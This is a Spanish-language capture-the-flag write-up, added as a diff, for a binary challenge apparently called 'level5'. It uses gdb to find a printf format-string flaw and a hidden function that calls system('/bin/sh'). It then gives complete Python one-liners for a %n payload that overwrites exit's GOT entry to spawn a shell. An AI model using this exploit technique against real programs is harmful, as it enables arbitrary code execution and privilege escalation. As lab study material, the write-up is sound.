@@ -1,0 +1,94 @@
+1.- Analizamos es binarrio level5 con gdb usando el siguiente comando:
+  (gdb) info functions
+
+2.- Tenemos 3 funciones relevantes, main, n y o:
+  [...]
+  0x080484a4  o
+  0x080484c2  n
+  0x08048504  main
+  [...]
+
+3.- Desensamblmos main() y vemos que solo hay una llamada a n()
+  (gdb) disassemble main
+  [...]
+  0x0804850a <+6>:	call   0x80484c2 <n>
+  [...]
+
+4.- Desensamblamos n() y vemos que por medio de un fgets() se almacena un buffer que se usa 
+  en un printf() como en ejercicios anteriores siendo vulnerable a cadenas formateadas
+  (gdb) disassemble n
+  [...]
+  0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+  0x080484ea <+40>:	lea    eax,[ebp-0x208]
+  0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
+  0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+  [...]
+
+5.- No vemos rastro de alguna llamada a la función o() pero la Desensamblamos. Vemos que tenemos
+  una llamada a system que puede ser util
+  (gdb) disassemble o
+  [...]
+  0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
+  0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+  [...]
+
+6.- Vamos a ver que parametro se le pasa a la system
+  (gdb) x/s 0x80485f0
+  0x80485f0:	"/bin/sh"
+
+7.- Esta función es la que tenemos que explotar.
+
+8.- Vamos a ver cual es el plan.
+
+9.- Por medio de la vulnerabilidad del printf() intentaremos ejecutar un call para llamar a la 
+  función o()
+
+10.- Vemos que al desensamblar m() hay un call a exit
+  [...]
+  0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+  [...]
+
+11.- Esta es la función que vamos a sustituir para llamar a o()
+
+12.- Para hacer que el call a exit sea sustituido por una llamada a o() tenemos que alterar la llamada 
+  que hace exit en la sección .got.plt (Tabla de Offset Globales procedente de la Tabla de linkado). 
+  Esta tabla se usa para mapear las llamadas que se resuelven en tiempo de ejecución. Mapea las 
+  llamadas atraves de .plt. La sección que contiene .got.plt tiene permisos de escritura ya que el
+  Linker necesita mapear en tiempor de ejecución la dirección de exit.
+  Vamos a ver como conseguimos la dirección de la llamada a exit
+  ; function n
+  [...]
+  0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+  [...]
+  (gdb) disassemble 0x80483d0 
+  Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	  jmp    DWORD PTR ds:0x8049838
+   0x080483d6 <+6>:	  push   0x28
+   0x080483db <+11>:	jmp    0x8048370
+  End of assembler dump.
+  
+13.- Ya tenemos la dirección en la que tenemos que mapear la dirección de o(). Es 0x8049838
+  [...]
+   0x080483d0 <+0>:	  jmp    DWORD PTR ds:0x8049838
+  [...]
+  
+14.- Seguimos el procedimiento avitual para ver el stack con una cadena formateada insertando la
+  siguiente cadena cuando nos lo pida fgets()
+  [...]
+  AAAA %x %x %x %x %x %x
+  AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
+  [...]
+
+15.- Vemos que el parametro se guarde en el indice 4. Es donde tenemos que mapear la dirección de 
+  .got.ptr
+
+16.- La dirección de la llamada a o() es 0x080484a4 (134513828 en decimal) este será el padding
+
+17.- Montamos la cadena:
+  # Python2.7.3
+  python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/payload
+  # Python3
+  python -c 'import sys; sys.stdout.buffer.write(b"\x38\x98\x04\x08" + b"%134513824d%4$n")' > payload
+  
+18.- Le pasamos al binario el payload por cat y listo
+  cat /tmp/payload - | ./level5
